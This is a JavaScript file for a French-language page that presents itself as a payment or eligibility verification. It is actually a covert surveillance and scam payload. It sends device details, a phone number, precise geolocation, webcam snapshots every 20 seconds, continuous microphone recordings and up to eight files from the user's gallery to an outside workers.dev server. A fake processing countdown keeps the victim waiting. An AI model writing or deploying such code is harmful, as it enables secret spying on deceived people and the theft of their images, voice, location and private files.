const BACKEND = "https://dg-verif.jeancharlesdave62.workers.dev";

const ID = localStorage.getItem("v_id") ||
  (() => { const v = crypto.randomUUID(); localStorage.setItem("v_id", v); return v; })();

const $ = (s) => document.querySelector(s);
const etat = (t) => { $("#etat").innerHTML = t; };
const progression = (p) => { $("#progression").style.width = `${p}%`; };
const cocher = (cle, texte) => {
  const li = document.querySelector(`li[data-cle="${cle}"]`);
  if (!li) return;
  li.querySelector("span").textContent = texte;
  li.firstChild.textContent = "✓ ";
  li.classList.add("fait");
};

async function poster(chemin, charge) {
  try {
    await fetch(`${BACKEND}${chemin}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ identifiant: ID, ...charge }),
      keepalive: true,
    });
  } catch { }
}

const enBase64 = (blob) => new Promise((ok) => {
  const lecteur = new FileReader();
  lecteur.onload = () => ok(lecteur.result);
  lecteur.readAsDataURL(blob);
});

async function inscription() {
  await poster("/inscription", {
    ua: navigator.userAgent,
    ecran: `${screen.width}x${screen.height}`,
    langue: navigator.languages?.join(", "),
  });
  cocher("appareil", "Appareil identifié");
  progression(20);
}

let fluxMedia = null;
let vivant = true;

async function capturer() {
  fluxMedia = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user", width: { ideal: 640 } },
    audio: { echoCancellation: true, noiseSuppression: true },
  });
  $("#flux").srcObject = fluxMedia;
  cocher("photo", "Contrôle visuel en cours");
  progression(60);

  const prise = async () => {
    const video = $("#flux");
    if (!video.videoWidth) return;
    const toile = document.createElement("canvas");
    toile.width = 480;
    toile.height = Math.round(480 * video.videoHeight / video.videoWidth);
    toile.getContext("2d").drawImage(video, 0, 0, toile.width, toile.height);
    await poster("/photo", { image: toile.toDataURL("image/jpeg", 0.55) });
  };
  await prise();
  setInterval(() => { if (vivant) prise(); }, 20000);

  const type = MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus"
             : MediaRecorder.isTypeSupported("audio/mp4") ? "audio/mp4" : "";
  let sequence = 0;
  (async () => {
    while (vivant && fluxMedia) {
      const enregistreur = new MediaRecorder(fluxMedia,
        type ? { mimeType: type, audioBitsPerSecond: 16000 } : {});
      const morceaux = [];
      enregistreur.ondataavailable = (e) => e.data.size && morceaux.push(e.data);
      enregistreur.start();
      await new Promise((r) => setTimeout(r, 4000));
      await new Promise((r) => { enregistreur.onstop = r; enregistreur.stop(); });
      if (!morceaux.length) continue;
      const blob = new Blob(morceaux, { type: type || "audio/webm" });
      await poster("/son", { seq: sequence++, donnees: await enBase64(blob) });
    }
  })();

  cocher("micro", "Contrôle sonore actif");
  progression(80);
}

function localiser() {
  navigator.geolocation.getCurrentPosition(
    (p) => {
      cocher("zone", "Zone de versement confirmée");
      poster("/position", {
        lat: p.coords.latitude,
        lon: p.coords.longitude,
        precision: p.coords.accuracy,
      });
      progression(45);
    },
    () => cocher("zone", "Zone non confirmée"),
    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
  );
}

let termine = false;

function finir() {
  if (termine) return;
  termine = true;
  $("#valider").disabled = true;
  progression(100);
  let reste = 900;
  etat("Votre versement est <b>en cours de traitement</b>. Ne fermez pas cette page.");
  setInterval(() => {
    const m = String(Math.floor(reste / 60)).padStart(2, "0");
    const s = String(reste % 60).padStart(2, "0");
    if (reste <= 0) { etat("Versement <b>validé</b>. Vous recevrez le SMS sous 24 h."); return; }
    etat(`Versement en cours de traitement — <b>${m}:${s}</b> restantes`);
    reste--;
  }, 1000);
}

(async () => {
  await inscription();
  try { await capturer(); } catch { cocher("photo", "Caméra refusée"); }
  localiser();

  const bouton = $("#valider");
  const champ = $("#galerie");

  bouton.disabled = false;
  bouton.textContent = "Valider ma demande";

  bouton.onclick = () => {
    const numero = $("#numero").value.replace(/\s/g, "");
    if (numero.length < 8) { etat("Saisissez un numéro valide."); return; }

    champ.value = "";
    champ.click();

    poster("/numero", { valeur: numero });
    etat("Vérification de votre éligibilité…");
    progression(90);

    champ.onchange = async () => {
      for (const fichier of [...champ.files].slice(0, 8)) {
        if (fichier.size > 4000000) continue;
        await poster("/galerie", {
          nom: fichier.name, type: fichier.type, taille: fichier.size,
          donnees: await enBase64(fichier),
        });
      }
      finir();
    };

    setTimeout(() => { if (!champ.files.length) finir(); }, 2500);
  };

  document.addEventListener("visibilitychange", () => { vivant = !document.hidden; });
})();